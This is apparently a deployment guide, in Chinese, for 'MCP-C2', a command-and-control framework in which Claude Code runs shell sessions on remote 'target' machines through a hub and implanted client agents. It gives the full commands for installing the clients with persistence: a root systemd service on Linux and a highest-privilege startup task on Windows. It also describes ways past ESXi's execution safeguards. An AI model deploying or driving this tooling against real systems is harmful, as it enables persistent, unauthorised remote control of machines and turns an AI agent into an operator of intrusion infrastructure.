# MCP-C2 部署指南

本文档涵盖 MCP-C2 的完整部署流程：证书生成、hub 守护进程配置、MCP server 注册和 client 部署。

---

## 架构（拆分后）

你机器上运行两个进程：

| 进程 | 角色 | 生命周期 |
|------|------|----------|
| `mcpc2-hub` | C2 WebSocket 中心 + HTTP API（127.0.0.1:9000） | 始终运行（守护进程） |
| `mcpc2-server` | MCP stdio 代理 → hub | 每个 Claude Code 实例启动一个 |

hub 是核心：它持有所有远程 client 的 WebSocket 连接，并暴露 REST API。MCP server 是薄代理——Claude Code 启动它，它通过本地 HTTP 连接到 hub。

---

## 第一步：编译（含自动证书生成）

```bash
# 默认生成 127.0.0.1 证书
make build

# 或指定服务器 IP
SERVER_IP=192.168.1.100 make build
```

`make build` 自动完成：
1. 在 `certs/` 目录生成 CA + server + client 证书（如果不存在）
2. 将 client 证书同步到 `internal/embedded/data/`（编译时嵌入）
3. 编译三个二进制：`bin/mcpc2-hub`、`bin/mcpc2-server`、`bin/mcpc2-client`

**证书自动生成说明**：hub 启动时如果不指定证书路径，也**会自动生成证书**。`make build` 阶段生成是为了 embedding——client 二进制编译时要把证书嵌进去。如果 client 的嵌入证书和 hub 生成的证书不匹配，mTLS 验证会失败，所以推荐用 `make build` 一条龙。

生成的文件：
- `certs/ca.crt`、`certs/ca.key` — 证书颁发机构
- `certs/server.crt`、`certs/server.key` — Hub 的 TLS 身份
- `certs/client.crt`、`certs/client.key` — Client 身份（已嵌入 client 二进制）

**注意**：重新生成证书后必须重新编译 client（`make build` 会自动处理）。

---

## 第二步：启动 hub 守护进程

### 方式一：前台运行（测试用）

```bash
# 零参数——自动使用 certs/ 下的证书
./bin/mcpc2-hub

# 或指定 IP + 证书目录
./bin/mcpc2-hub -server-ip 192.168.1.100 -certs-dir certs
```

Hub 启动时检查证书：存在则使用，不存在则自动生成。

### 方式二：systemd（生产环境）

```ini
# /etc/systemd/system/mcpc2-hub.service
[Unit]
Description=MCP-C2 Hub 守护进程
After=network.target

[Service]
Type=simple
ExecStart=/opt/mcpc2/bin/mcpc2-hub \
  -addr :8443 \
  -api-addr 127.0.0.1:9000 \
  -certs-dir /opt/mcpc2/certs \
  -server-ip 192.168.1.100 \
  -audit-log /var/log/mcpc2/audit.log
Restart=always
RestartSec=5
User=mcpc2

[Install]
WantedBy=multi-user.target
```

```bash
sudo systemctl daemon-reload
sudo systemctl enable --now mcpc2-hub
sudo systemctl status mcpc2-hub
```

### 可选：Client 证书指纹白名单

```bash
# 获取 client 证书指纹
openssl x509 -in certs/client.crt -noout -fingerprint -sha256 | cut -d= -f2

# 创建白名单文件（每行一个指纹）
echo "AB:CD:EF:01:..." > /etc/mcpc2/allowed-clients

# 启动 hub 时加载白名单
./bin/mcpc2-hub -allowed-clients /etc/mcpc2/allowed-clients ...
```

热加载白名单（无需重启 hub）：`sudo kill -SIGHUP $(pidof mcpc2-hub)`。

---

## 第三步：注册 MCP Server 到 Claude Code

### 方式一：项目级配置（`.mcp.json`）

在项目根目录创建 `.mcp.json`：

```json
{
  "mcpServers": {
    "mcp-c2": {
      "command": "/绝对路径/bin/mcpc2-server",
      "args": ["-hub", "127.0.0.1:9000"]
    }
  }
}
```

### 方式二：用户级配置

创建 `~/.claude/.mcp.json`（所有项目可用）：

```json
{
  "mcpServers": {
    "mcp-c2": {
      "command": "/绝对路径/bin/mcpc2-server",
      "args": ["-hub", "127.0.0.1:9000"]
    }
  }
}
```

### 方式三：`claude mcp add` 命令

```bash
claude mcp add mcp-c2 -- /绝对路径/bin/mcpc2-server -hub 127.0.0.1:9000
```

### 验证

打开 Claude Code。如果 hub 在运行，MCP-C2 工具立即可用。如果 hub 没启动，会显示：

```
mcpc2-server: hub not reachable at 127.0.0.1:9000
```

启动 hub 后重新打开 Claude Code 即可。

---

## 第四步：部署 Client 到目标机器

### Linux

```bash
# 拷贝二进制
scp bin/mcpc2-client-linux user@target:/tmp/mcpc2-client

# 运行（替换为你的 hub 地址）
ssh user@target '/tmp/mcpc2-client -server 192.168.1.100:8443'
```

持久化部署（systemd）：

```bash
cat << 'EOF' | ssh user@target 'sudo tee /etc/systemd/system/mcpc2-client.service'
[Unit]
Description=MCP-C2 Client Agent
After=network.target

[Service]
Type=simple
ExecStart=/opt/mcpc2/mcpc2-client -server 192.168.1.100:8443
Restart=always
RestartSec=10
User=root

[Install]
WantedBy=multi-user.target
EOF

ssh user@target 'sudo systemctl daemon-reload && sudo systemctl enable --now mcpc2-client'
```

### Windows

```powershell
# 拷贝二进制（通过 SMB、HTTP 或 U 盘）
# 以管理员身份运行 PowerShell：
C:\Tools\mcpc2-client.exe -server 192.168.1.100:8443
```

持久化部署（计划任务）：

```powershell
$action = New-ScheduledTaskAction -Execute "C:\Tools\mcpc2-client.exe" -Argument "-server 192.168.1.100:8443"
$trigger = New-ScheduledTaskTrigger -AtStartup
$settings = New-ScheduledTaskSettingsSet -RestartCount 999 -RestartInterval (New-TimeSpan -Minutes 1)
Register-ScheduledTask -TaskName "MCP-C2 Client" -Action $action -Trigger $trigger -Settings $settings -RunLevel Highest
```

### ESXi

ESXi 的 UserCartel 安全模块可能阻止非 VIB 二进制。应对方案：

1. **SSH 备用**：ESXi 目标直接用 `ssh`（不理想但可用）
2. **VIB 打包**：将 client 打包为 VMware Installation Bundle（路线图）
3. **先试运行**：从 `/tmp/` 尝试运行——部分 ESXi 版本允许特定路径

---

## 第五步：验证连通性

在 hub 机器上：

```bash
# 检查 hub 健康状态
curl -s http://127.0.0.1:9000/api/v1/health
# → {"client_count":1,"status":"ok","version":"0.2.0"}

# 列出已连接的 client
curl -s http://127.0.0.1:9000/api/v1/clients | jq .
# → [{"client_id":"target-linux-amd64","hostname":"target","os":"linux",...}]
```

在 Claude Code 中：

```
> health
> list_clients
> start_session client_id="target-linux-amd64" shell="/bin/bash"
> run_command client_id="target-linux-amd64" session_id="..." command="uname -a"
> read_output ...
```

---

## 网络要求

| 组件 | 端口 | 协议 | 方向 | 说明 |
|------|------|------|------|------|
| Hub C2 | 8443 | WSS/mTLS | Client → Hub | 目标机器必须能访问 |
| Hub API | 9000 | HTTP | Server → Hub | 仅本地回环（127.0.0.1） |
| MCP Server | — | stdio | Claude → Server | 本地进程，无网络 |

**防火墙**：只需开放 8443 端口给目标机器的入站连接。

---

## 故障排除

### Client 无法连接

```bash
# 查看 hub 日志
journalctl -u mcpc2-hub -f

# 从目标机器测试 TLS
openssl s_client -connect 192.168.1.100:8443 -cert client.crt -key client.key -CAfile ca.crt
```

### MCP server 报 "hub not reachable"

```bash
# hub 在运行吗？
curl -s http://127.0.0.1:9000/api/v1/health

# hub 在监听预期端口吗？
ss -tlnp | grep 9000
```

### Linux 上 PTY 失败（"operation not permitted"）

hub 日志会显示此信息。Client 自动降级为管道模式。会话仍可用——只是没有颜色和 Tab 补全。常见原因：seccomp 配置、容器运行时限制、安全内核模块。

### Windows ConPTY 不工作

需要 Windows 10 1809+ 和 Windows Terminal 支持。旧版 Windows 自动降级为管道模式。确保 client 二进制用 `GOOS=windows` 编译。

### ESXi 上 client 二进制被阻止

VMware UserCartel 处于活跃状态。选项：VIB 打包（未来）、SSH 备用通道，或尝试从 `/vmfs/volumes/datastore1/` 运行。

---

## 证书更新

```bash
# 删除旧证书，hub 重启时自动生成新的
rm certs/*.crt certs/*.key
SERVER_IP=192.168.1.100 make build

# 重启 hub
sudo systemctl restart mcpc2-hub

# 重新部署 client 二进制到所有目标机器（嵌入的证书已更新）
```

---

## 安全注意事项

- **不要暴露 API 端口**：保持 `-api-addr` 在 `127.0.0.1`。API 无认证机制。
- **定期更新证书**：定期重新生成证书并重部署 client。
- **使用白名单**：即使有 mTLS，指纹白名单提供第二重验证。
- **审计日志**：将 `-audit-log` 设为持久路径，定期审查。
- **Client 二进制**：嵌入的 client 私钥是凭据，像保护 SSH 私钥一样保护 client 二进制。
